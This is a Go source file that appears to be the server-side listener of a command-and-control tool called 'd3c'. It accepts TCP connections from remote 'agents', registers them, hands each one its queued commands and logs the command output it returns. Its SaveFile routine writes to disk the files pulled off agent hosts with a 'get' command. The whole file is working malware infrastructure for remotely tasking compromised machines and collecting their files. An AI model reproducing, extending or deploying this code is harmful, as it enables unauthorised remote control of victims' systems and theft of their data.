package listeners

import (
	"d3c/server/helpers"
	"encoding/gob"
	"global"
	globalhelpers "helpers"
	"log"
	"net"
	"os"
	"strings"
)

func StartListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)

	if err != nil {
		log.Fatal("Error starting listener: ", err.Error())
	} else {

		for {
			channel, e := listener.Accept()

			if e != nil {
				log.Println("Error on a new channel: ", e.Error())
			} else {
				message := &global.Message{}

				gob.NewDecoder(channel).Decode(message)

				// Agent registration verification
				if helpers.AgentRegistration(message.AgentID) {

					if helpers.CommandResponse(*message) {
						log.Println("Host Message: ", message.AgentHostname)

						//Print response
						for i, v := range message.Commands {
							log.Println("Command: ", v.Request)
							println(v.Response)

							if globalhelpers.CommandsSplit(v.Request)[0] == "get" &&
								!message.Commands[i].File.Error {
								SaveFile(message.Commands[i].File)
							}
						}
					}
					// Send queue commands to agent
					gob.NewEncoder(channel).Encode(helpers.FieldAgents[helpers.AgentFieldPosition(message.AgentID)])
					//Clear command list
					helpers.FieldAgents[helpers.AgentFieldPosition(message.AgentID)].Commands = []global.Command{}

				} else {
					log.Println("New connection: ", channel.RemoteAddr().String())
					log.Println("Agent ID: ", message.AgentID)

					helpers.FieldAgents = append(helpers.FieldAgents, *message)
					gob.NewEncoder(channel).Encode(message)
				}

				channel.Close()
			}
		}
	}
}

func SaveFile(file global.File) {
	fileName := strings.Split(file.Name, "/")
	err := os.WriteFile(fileName[len(fileName)-1], file.Content, 0644)

	if err != nil {
		log.Println("Get file error: ", err.Error())
	}
}
